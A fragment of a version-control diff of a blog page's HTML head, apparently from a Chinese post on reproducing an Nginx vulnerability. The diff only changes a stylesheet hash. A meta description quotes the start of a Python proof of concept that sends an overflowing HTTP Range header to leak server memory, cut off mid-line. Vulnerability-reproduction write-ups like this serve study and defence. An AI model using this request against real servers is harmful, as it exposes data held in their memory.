@@ -14,7 +14,7 @@ POC已经在当前目录中给出来，文件名poc.py:
 #!/usr/bin/env python import sys import requests if len(sys.argv) < 2: print(&#34;%surl&#34; % (sys.argv[0])) print(&#34;eg: python %shttp://your-ip:8080/&#34; % (sys.argv[0])) sys.exit() headers = { 'User-Agent': &#34;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&#34; } offset = 605 url = sys.argv[1] file_len = len(requests.get(url, headers=headers).content) n = file_len + offset headers['Range'] = &#34;bytes=-%d,-%d&#34; % ( n, 0x8000000000000000 - n) r = requests.">
 <meta name=author content="DaChui">
 <link rel=canonical href=https://oopsdc.tk/post/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/>
-<link href=/assets/css/stylesheet.min.746a86b58bb2b052b5e4df8216510494f04f81e62c08d626150c26c69ca929da.css integrity="sha256-dGqGtYuysFK15N+CFlEElPBPgeYsCNYmFQwmxpypKdo=" rel="preload stylesheet" as=style>
+<link href=/assets/css/stylesheet.min.fe37c241822b208b1ade5508f8fdbbe116fdf98dae7ffe71501145355d4636b4.css integrity="sha256-/jfCQYIrIIsa3lUI+P274Rb9+Y2uf/5xUBFFNV1GNrQ=" rel="preload stylesheet" as=style>
 <link rel=icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
 <link rel=icon type=image/png sizes=16x16 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
 <link rel=icon type=image/png sizes=32x32 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
